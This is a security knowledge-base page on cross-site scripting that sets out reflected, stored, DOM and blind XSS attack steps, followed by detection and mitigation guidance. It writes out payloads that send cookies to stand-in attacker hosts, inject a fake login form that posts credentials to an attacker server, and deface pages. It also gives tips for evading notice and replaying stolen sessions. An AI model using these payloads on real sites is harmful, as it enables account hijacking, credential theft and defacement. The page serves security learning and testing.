---
title: "XSS"
category: "techniques"
tags: []
excerpt: "Cross-Site Scripting (XSS) is a client-side code injection attack where malicious JavaScript is injected into a trusted..."
date: "2026-05-17"
---

---
## Overview
Cross-Site Scripting (XSS) is a client-side code injection attack where malicious JavaScript is injected into a trusted web application and executed in the victim's browser. XSS targets other users of the application rather than the server itself. It can be used to steal session cookies, hijack accounts, redirect users to malicious pages, perform actions on behalf of the victim, or deliver malware. XSS is one of the most prevalent web vulnerabilities and falls under the Injection category of the [OWASP Top 10 - 2021](/knowledge/Web-Security/OWASP-Top-10---2021).

---
## When To Use
- A web application reflects user input in page output without sanitization
- User-generated content (comments, posts, usernames, profiles) is stored and rendered to other users
- JavaScript dynamically writes unvalidated input to the DOM

## Requirements
- A web application that renders user-controlled input in an HTML context
- Output that is not HTML-encoded before being written to the page
- No effective Content Security Policy (CSP) blocking inline script execution

---
## Attack Steps

### Reflected XSS
Input is sent to the server, processed, and immediately reflected in the response — typically in error messages, search results, or URL parameters. The attack is not persistent; the victim must be sent a crafted URL.

1. Identify a parameter whose value appears in the page response (search fields, error messages, URL path segments)
2. Inject a basic test payload: `<script>alert(1)</script>`
3. Confirm execution — if the browser fires the alert, the field is vulnerable
4. Escalate to cookie theft: `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`
5. Deliver the exploit as a crafted URL to the victim

### Stored XSS
Malicious input is saved to the back-end database and executed every time the stored content is rendered — affecting every user who views the page. No crafted URL required after injection.

1. Identify an input field whose output is stored and later displayed to others (comment boxes, profile fields, post bodies)
2. Inject the payload: `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`
3. Confirm the payload is stored and executes on page load for any viewer
4. Wait for victims — any user loading the affected page triggers the payload

### DOM XSS
JavaScript in the page reads unvalidated input (URL hash, query string, `localStorage`) and writes it directly to the DOM without the value passing through the server. Standard server-side output encoding does not prevent this.

1. Identify JavaScript sources: `location.hash`, `location.search`, `document.referrer`, `localStorage`, `window.name`
2. Trace where the value flows into dangerous sinks: `document.write()`, `innerHTML`, `outerHTML`, `eval()`, `setTimeout()`
3. Inject payload via the identified source:
   `http://target.com/page#"><img src=/ onerror=alert(document.cookie)>`
4. Confirm execution — payload fires entirely in the browser without a server round-trip

### Defacing

Website defacing uses stored XSS to modify the page's visual appearance for every visitor. The attack targets DOM properties that control page rendering and is typically irreversible until the stored payload is removed from the database.

#### Defacement Elements
| Property | Effect |
|----------|--------|
| `document.body.style.background` | Change background color (hex or named value) |
| `document.body.background` | Set background to a remote image URL |
| `document.title` | Change the browser tab title |
| `document.getElementsByTagName('body')[0].innerHTML` | Replace the entire page body with arbitrary HTML |

Inject a full body replacement: `<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1>Defaced</h1></center>'</script>`

To slow recovery, remove the original vulnerable input element after injection using `document.getElementById('<element-id>').remove()`.

### Phishing / Login Form Injection

XSS phishing injects a fake HTML login form that submits credentials to an attacker-controlled server. Stored XSS is preferred since authenticated users must load the page naturally to be targeted.

1. Inject a fake login form via `document.write()` using the XSS injection point as the entry:  
   `'><script>document.write('<h3>Please login to continue</h3><form action=http://<attacker-ip>><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');</script>`
2. Remove the original form element to reduce suspicion: append `document.getElementById('<form-id>').remove();` inside the same script block
3. Comment out trailing HTML artifacts at the end of the payload: ` <!--`
4. Host a server-side listener that captures the `username` and `password` GET parameters submitted by the form; use a PHP response that redirects to the legitimate page to avoid raising suspicion
5. Deliver the crafted URL or wait for victims to load the stored payload

### Session Hijacking

Session hijacking via XSS steals the victim's session cookie and replays it to impersonate them without needing credentials.

Cookie-stealing payloads:
- Navigate the victim's browser to the capture endpoint (noisy):  
  `<script>document.location='http://<attacker-ip>/index.php?c='+document.cookie;</script>`
- Silent image request (less detectable):  
  `<script>new Image().src='http://<attacker-ip>/index.php?c='+document.cookie;</script>`

A server-side script captures the `c` parameter and appends cookies to a file. Once captured, import the cookie via browser DevTools → Storage tab → add the cookie name and value → reload the target page to assume the victim's session.

`HTTPOnly` cookies are not accessible via JavaScript — session hijacking via XSS does not work against them, which is why the `HTTPOnly` flag is the most direct mitigation.

### Blind XSS Detection

Blind XSS occurs when the payload executes on a page the attacker cannot directly view — typically in admin panels, support ticket systems, contact forms, or HTTP User-Agent logging where content is reviewed by staff.

1. Inject a remote script tag into each user-input field, naming the URL path after the field being tested:  
   `<script src="http://<attacker-ip>/<field-name>"></script>`
2. Start an HTTP listener before testing — any inbound callback reveals which field triggered execution and confirms an admin is actively rendering the output
3. Once the vulnerable field is identified, replace the probe payload with a full session hijacking or cookie-stealing payload targeting the admin session

Email fields with strict format validation and password fields (hashed before storage) are generally not worth testing for blind XSS.

---
## Detection
- Test input fields with `<script>alert(1)</script>` and event-handler payloads: `"><img src=x onerror=alert(1)>`
- Review page source for user input appearing unencoded in the HTML
- For DOM XSS: audit JavaScript for dangerous sinks (`innerHTML`, `document.write()`, `eval()`, `setTimeout()`) and trace back to unvalidated sources
- Browser DevTools → Sources → search for `location.hash` or `location.search` usage to identify DOM sinks
- Burp Suite active scanner flags XSS candidates automatically
- When `alert()` is blocked by modern browsers (e.g., inside cross-origin iframes), use `<script>print()</script>` as an alternative confirmation — browsers rarely block the print dialog; `<plaintext>` stops HTML rendering and displays raw source, confirming injection without JavaScript execution
- Automated scanners — XSStrike (`python xsstrike.py -u "http://target/page?param=test"`), Brute XSS, and XSSer automate payload delivery and compare rendered responses; always manually verify scanner findings before reporting

## Mitigation
| Method | Description |
|--------|-------------|
| Output Encoding | Encode `<`, `>`, `"`, `'`, `&` before inserting user data into HTML context |
| Input Validation | Reject input that doesn't conform to expected format and length |
| Content Security Policy (CSP) | HTTP response header restricting which script sources the browser may execute |
| `HTTPOnly` Cookie Flag | Prevents JavaScript from reading session cookies, limiting cookie theft impact |
| Safe DOM APIs | Use `textContent` instead of `innerHTML`; sanitize via trusted library (DOMPurify) |
| `X-XSS-Protection` Header | Legacy browser-side filter — deprecated in modern browsers; not a primary control |

#### Back-End Sanitization Libraries
| Language | Input Sanitization | Output Encoding |
|----------|-------------------|-----------------|
| PHP | `addslashes()` escapes special characters with backslash | `htmlspecialchars()` or `htmlentities()` encodes `<`, `>`, `"`, `&` before rendering |
| Node.js | DOMPurify server-side: `DOMPurify.sanitize(dirty)` | `html-entities` library: `encode('<')` → `&lt;` |

Never pass raw user input (e.g., `$_GET['param']`) directly into page output — always encode at the point of rendering regardless of any prior sanitization.

#### Server Configuration
- `Content-Security-Policy: script-src 'self'` — restricts script execution to same-origin sources; the most effective server-side control against XSS
- `X-Content-Type-Options: nosniff` — prevents MIME-type sniffing that could allow script execution from non-script responses
- `HttpOnly` and `Secure` cookie flags — block JavaScript cookie access and enforce HTTPS transport, directly countering session hijacking via XSS
- A Web Application Firewall (WAF) detects and blocks common XSS patterns at the HTTP layer as an additional defense layer

Server controls reduce impact and raise the attack cost but do not replace output encoding.

---
## Related Knowledge
- [Website Innerworkings](/knowledge/Web-Security/Website-Innerworkings)
- [JavaScript Essentials](/knowledge/Web-Security/JavaScript-Essentials)
- [OWASP Top 10 - 2021](/knowledge/Web-Security/OWASP-Top-10---2021)

## Related Playbook
- [Red Team](/playbooks/Methodologies/Red-Team)

## Related Tools
- [Burp Suite](/tools/Web-Testing/Burp-Suite/Burp-Suite)
- [Burp Scanner](/tools/Web-Testing/Burp-Suite/Burp-Scanner)
- [XSStrike](/tools/Web-Testing/XSStrike)

---
## References / Images
- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP DOM XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
- PayloadsAllTheThings XSS payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
